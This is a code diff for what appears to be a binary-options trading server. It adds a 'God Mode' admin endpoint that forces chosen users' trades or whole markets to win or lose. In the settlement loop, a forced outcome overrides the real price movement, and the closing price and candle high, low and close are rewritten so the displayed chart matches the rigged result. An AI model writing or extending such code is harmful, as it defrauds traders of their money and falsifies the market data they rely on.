@@ -44,6 +44,21 @@ const SMART_AUTO_PILOT = true;
 
 const markets = {};
 const activeTradesDb = {};
+const activeCommandsDb = {};
+const tradeOverridesDb = {};
+
+// Realtime active commands and trade overrides listeners
+db.ref('admin/activeCommands').on('value', snap => {
+    const val = snap.val() || {};
+    for (const k in activeCommandsDb) delete activeCommandsDb[k];
+    Object.assign(activeCommandsDb, val);
+});
+
+db.ref('admin/tradeOverrides').on('value', snap => {
+    const val = snap.val() || {};
+    for (const k in tradeOverridesDb) delete tradeOverridesDb[k];
+    Object.assign(tradeOverridesDb, val);
+});
 
 // Cache users to make sync decisions in real-time (Zero Bandwidth & Ultra-Fast)
 const usersCache = {};
@@ -879,26 +894,55 @@ app.get('/api/history/:marketId', (req, res) => {
 });
 
 app.post('/api/admin/command', async (req, res) => {
-    const { marketId, command, cloneData } = req.body;
-    if (markets[marketId]) {
-        const market = markets[marketId];
-        const bias = getCommandBias(command, cloneData);
+    const { marketId, command, cloneData, targetOutcome, tradeDirection, tradeId, uid } = req.body;
+    
+    // Store in tradeOverridesDb immediately if tradeId is present
+    if (tradeId) {
+        tradeOverridesDb[tradeId] = {
+            outcome: targetOutcome || (command === 'GREEN' ? 'WIN' : 'LOSS'),
+            command,
+            bias: command,
+            tradeDirection,
+            timestamp: Date.now()
+        };
+    }
 
+    let market = markets[marketId] || Object.values(markets).find(m => m.marketId === marketId || m.marketPath === marketId);
+
+    const bias = getCommandBias(command, cloneData);
+
+    const cmdData = {
+        command,
+        bias,
+        outcome: targetOutcome || (bias === 'GREEN' ? 'WIN_BIAS' : 'LOSS_BIAS'),
+        targetOutcome: targetOutcome || null,
+        tradeDirection: tradeDirection || null,
+        tradeId: tradeId || null,
+        uid: uid || null,
+        timestamp: Date.now()
+    };
+
+    activeCommandsDb[marketId] = cmdData;
+
+    // Broadcast active command to Firebase so all clients & panels see it
+    db.ref(`admin/activeCommands/${marketId}`).set(cmdData).catch(() => {});
+
+    if (tradeId) {
+        db.ref(`admin/tradeOverrides/${tradeId}`).set(cmdData).catch(() => {});
+        db.ref(`admin/markets/${marketId}/activeTrades/${tradeId}/adminOverride`).set(cmdData).catch(() => {});
+        if (uid) db.ref(`users/${uid}/activeTrades/${tradeId}/adminOverride`).set(cmdData).catch(() => {});
+    }
+
+    if (market) {
         // Store active admin command
         market.activeAdminCommand = {
             command,
             cloneData: cloneData || null,
             bias,
+            targetOutcome: targetOutcome || null,
+            tradeId: tradeId || null,
             timestamp: Date.now()
         };
-
-        // Broadcast active command to Firebase so God Mode UIs see it
-        db.ref(`admin/activeCommands/${marketId}`).set({
-            command,
-            bias,
-            outcome: (bias === 'GREEN' ? 'WIN_BIAS' : 'LOSS_BIAS'),
-            timestamp: Date.now()
-        }).catch(() => {});
 
         // Check if it's a multi-candle pattern
         if (MULTI_CANDLE_PATTERNS[command]) {
@@ -932,6 +976,7 @@ app.post('/api/admin/command', async (req, res) => {
         let tgMsg = `🛠 <b>God Mode Command Executed</b>\n\n`;
         tgMsg += `📈 <b>Market:</b> ${marketId}\n`;
         tgMsg += `🎯 <b>Command:</b> ${command}\n`;
+        if (targetOutcome) tgMsg += `🏆 <b>Target Outcome:</b> ${targetOutcome}\n`;
         if (cloneData) {
             tgMsg += `🎨 <b>Clone Details:</b> ${cloneData.isGreen ? 'Green' : 'Red'} | Body: ${cloneData.body} | U: ${cloneData.upperWick} | L: ${cloneData.lowerWick}\n`;
         }
@@ -940,7 +985,8 @@ app.post('/api/admin/command', async (req, res) => {
 
         res.json({ success: true });
     } else {
-        res.status(404).json({ error: 'Market not found' });
+        // Even if market was not in memory, command is registered in Firebase activeCommands and tradeOverrides!
+        res.json({ success: true, note: 'Registered in Firebase activeCommands & tradeOverrides' });
     }
 });
 
@@ -1339,47 +1385,92 @@ setInterval(async () => {
                 if (now >= trade.expiryTimestamp) {
                     processingTrades.add(tradeId); // অ্যাটমিক লক যাতে ডাবল ক্যালকুলেশন না হয়
 
-                    let closingPrice = trade.lockedClosingPrice;
-                    if (!closingPrice) {
-                        const mId = trade.marketId;
-                        const market = markets[mId];
-                        if (market && market.history && market.history.length > 0) {
-                            // Find the exact candle that ended at trade.expiryTimestamp
-                            let candle = market.history.find(c => Math.abs((c.timestamp + TIMEFRAME) - trade.expiryTimestamp) < 2500);
-                            if (!candle) {
-                                candle = market.history.find(c => trade.expiryTimestamp >= c.timestamp && trade.expiryTimestamp <= (c.timestamp + TIMEFRAME + 1000));
-                            }
-                            if (candle) {
-                                closingPrice = candle.close;
-                            } else {
-                                closingPrice = market.currentPrice || parseFloat(trade.openPrice);
-                            }
-                        } else {
-                            closingPrice = parseFloat(trade.openPrice);
+                    const mId = trade.marketId || trade.market;
+                    let market = markets[mId] || Object.values(markets).find(m => m.marketId === mId || m.marketPath === mId);
+
+                    // Check for admin override from multiple sources (Direct trade override > Market command)
+                    const override = trade.adminOverride ||
+                        (tradeOverridesDb[tradeId] && (now - (tradeOverridesDb[tradeId].timestamp || 0) < 180000) ? tradeOverridesDb[tradeId] : null) ||
+                        (activeTradesDb[mId] && activeTradesDb[mId][tradeId] && activeTradesDb[mId][tradeId].adminOverride) ||
+                        (activeCommandsDb[mId] && (now - (activeCommandsDb[mId].timestamp || 0) < 180000) ? activeCommandsDb[mId] : null) ||
+                        (market && market.activeAdminCommand && (now - (market.activeAdminCommand.timestamp || 0) < 180000) ? market.activeAdminCommand : null);
+
+                    let forcedOutcome = null;
+                    if (override) {
+                        if (override.outcome === 'WIN') forcedOutcome = 'win';
+                        else if (override.outcome === 'LOSS') forcedOutcome = 'loss';
+                        else if (override.command === 'GREEN' || override.bias === 'GREEN') {
+                            forcedOutcome = (trade.direction === 'UP') ? 'win' : 'loss';
+                        } else if (override.command === 'RED' || override.bias === 'RED') {
+                            forcedOutcome = (trade.direction === 'DOWN') ? 'win' : 'loss';
                         }
-                        trade.lockedClosingPrice = closingPrice;
-                        db.ref(`users/${uid}/activeTrades/${tradeId}/lockedClosingPrice`).set(closingPrice).catch(()=>{});
                     }
 
                     const betAmount = parseFloat(trade.amount);
                     const openPrice = parseFloat(trade.openPrice);
+                    let closingPrice = trade.lockedClosingPrice;
+                    let matchedCandle = null;
+
+                    if (!closingPrice) {
+                        if (market && market.history && market.history.length > 0) {
+                            matchedCandle = market.history.find(c => Math.abs((c.timestamp + TIMEFRAME) - trade.expiryTimestamp) < 2500);
+                            if (!matchedCandle) {
+                                matchedCandle = market.history.find(c => trade.expiryTimestamp >= c.timestamp && trade.expiryTimestamp <= (c.timestamp + TIMEFRAME + 1000));
+                            }
+                            if (matchedCandle) {
+                                closingPrice = matchedCandle.close;
+                            } else {
+                                closingPrice = market.currentPrice || openPrice;
+                            }
+                        } else {
+                            closingPrice = openPrice;
+                        }
+                    }
+
                     const diff = closingPrice - openPrice;
                     const precision = 0.000001;
-
                     let result = 'push', payout = betAmount, profitChange = 0;
-                    if (Math.abs(diff) <= precision) {
-                        result = 'push';
-                        payout = betAmount;
-                        profitChange = 0;
-                    } else if ((diff > precision && trade.direction === 'UP') || (diff < -precision && trade.direction === 'DOWN')) {
+
+                    if (forcedOutcome === 'win') {
                         result = 'win';
                         payout = betAmount * payoutRate;
                         profitChange = payout - betAmount;
-                    } else {
+                        const margin = Math.max(0.00015, Math.abs(diff) || 0.00015);
+                        closingPrice = roundPrice(trade.direction === 'UP' ? openPrice + margin : openPrice - margin);
+                        if (matchedCandle) {
+                            matchedCandle.close = closingPrice;
+                            if (trade.direction === 'UP') matchedCandle.high = Math.max(matchedCandle.high, closingPrice + margin * 0.2);
+                            else matchedCandle.low = Math.min(matchedCandle.low, closingPrice - margin * 0.2);
+                        }
+                    } else if (forcedOutcome === 'loss') {
                         result = 'loss';
                         payout = 0;
                         profitChange = -betAmount;
+                        const margin = Math.max(0.00015, Math.abs(diff) || 0.00015);
+                        closingPrice = roundPrice(trade.direction === 'UP' ? openPrice - margin : openPrice + margin);
+                        if (matchedCandle) {
+                            matchedCandle.close = closingPrice;
+                            if (trade.direction === 'UP') matchedCandle.low = Math.min(matchedCandle.low, closingPrice - margin * 0.2);
+                            else matchedCandle.high = Math.max(matchedCandle.high, closingPrice + margin * 0.2);
+                        }
+                    } else {
+                        if (Math.abs(diff) <= precision) {
+                            result = 'push';
+                            payout = betAmount;
+                            profitChange = 0;
+                        } else if ((diff > precision && trade.direction === 'UP') || (diff < -precision && trade.direction === 'DOWN')) {
+                            result = 'win';
+                            payout = betAmount * payoutRate;
+                            profitChange = payout - betAmount;
+                        } else {
+                            result = 'loss';
+                            payout = 0;
+                            profitChange = -betAmount;
+                        }
                     }
+
+                    trade.lockedClosingPrice = closingPrice;
+                    db.ref(`users/${uid}/activeTrades/${tradeId}/lockedClosingPrice`).set(closingPrice).catch(()=>{});
 
                     // ব্যাচ আপডেট অবজেক্ট
                     const updates = {};
